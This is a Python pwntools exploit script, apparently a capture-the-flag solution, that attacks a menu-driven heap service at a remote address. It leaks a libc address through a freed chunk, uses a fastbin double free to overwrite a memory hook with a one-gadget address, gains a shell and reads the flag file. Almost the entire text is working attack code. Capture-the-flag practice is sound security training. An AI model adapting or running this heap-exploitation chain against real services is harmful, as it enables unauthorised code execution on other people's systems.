from pwn import *

#p = process('./pwn')
p = remote('172.16.9.25', 8890)

def add_chara(l, n, t):
	p.recvuntil('choice : ')
	p.sendline('1')
	p.recvuntil('name :')
	p.sendline(str(l))
	p.recvuntil('character :')
	p.sendline(n)
	p.recvuntil('character :')
	p.sendline(t)


def del_chara(i):
	p.recvuntil('choice :')
	p.sendline('3')
	p.recvuntil('eat:')
	p.sendline(str(i))

def clean_all():
	p.recvuntil('choice :')
	p.sendline('4')

def view_chara():
	p.recvuntil('choice :')
	p.sendline('2')
	

add_chara(256, 'aaa', 'aaa')
add_chara(256, 'bbb', 'bbb')
del_chara(0)
clean_all()
add_chara(256, '', 'aaa')
view_chara()
p.recvuntil('Name[0] :')
p.recvline()
addr = '\x0a' + p.recvline().strip()
addr = u64(addr.ljust(8, '\x00'))
log.info("%x" % addr)
add_chara(104, 'ccc', 'ccc')
add_chara(104, 'ddd', 'ddd')
add_chara(104, 'eee', 'eee')
del_chara(2)
del_chara(3)
del_chara(2)
add_chara(104, p64(0x7efdcbb1771d - 0x7efdcbb1770a + addr), 'fff')
add_chara(104, 'ggg', 'ggg')
add_chara(104, 'hhh', 'hhh')
add_chara(104, 'a' * 19 + p64(0x7efdcb839d9f - 0x7efdcbb1770a + addr), 'iii')
del_chara(0)
del_chara(0)

p.sendline('cat /flag')
flag = p.recvline().strip()
print flag

p.interactive()

